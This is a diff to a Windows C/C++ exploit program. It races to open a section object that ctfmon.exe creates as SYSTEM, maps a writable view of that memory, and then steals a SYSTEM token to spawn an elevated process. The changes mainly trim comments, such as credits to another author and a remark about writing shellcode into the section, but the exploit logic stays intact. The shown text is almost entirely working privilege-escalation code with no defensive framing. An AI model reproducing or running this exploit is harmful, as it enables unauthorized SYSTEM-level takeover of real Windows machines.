@@ -315,27 +315,21 @@ int wmain(int argc, wchar_t** argv)
     shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
     ShellExecuteEx(&shi);
 
-    // Boost priority to improve race-window odds (idea from JoeysCode).
+    // Boost priority to improve race-window odds; yield instead of spinning.
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
     do {
         _NtOpenSection(&hmapping, MAXIMUM_ALLOWED, &objattr);
-        if (!hmapping) YieldProcessor(); // yield instead of burning the core (idea from JoeysCode)
+        if (!hmapping) YieldProcessor();
     } while (!hmapping);
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
 
-    // Map a writable view of the SYSTEM-created section (idea from JoeysCode).
-    // Proves we have write access to memory owned by SYSTEM; a real payload
-    // could write shellcode here before a privileged consumer maps it.
+    // Map a writable view — proves write access to the SYSTEM-created section.
     pSectionView = MapViewOfFile(hmapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
     if (pSectionView)
         printf("[*] SYSTEM section mapped at %p — writable view confirmed\n", pSectionView);
 
-    // ---- BEGIN: Added — steal SYSTEM token while ctfmon is still alive ----
-    //
-    // At this point ctfmon.exe is running as SYSTEM (it just created the section).
-    // Walk the process list, grab a SYSTEM token, and spawn an elevated cmd.exe.
-    // Requires SeDebugPrivilege (available to local admins) and
-    // SeImpersonatePrivilege (available to local admins / service accounts).
+    // Steal SYSTEM token while ctfmon is still alive (it just created the section).
+    // Requires SeDebugPrivilege + SeImpersonatePrivilege (local admins by default).
     {
         printf("[*] Section created — attempting SYSTEM token theft...\n");
         HANDLE hSysToken = StealSystemToken();
@@ -346,7 +340,6 @@ int wmain(int argc, wchar_t** argv)
             printf("[-] Could not obtain a SYSTEM token.\n");
         }
     }
-    // ---- END: Added ----
 
     lockblock = SetPolicyVal();
 
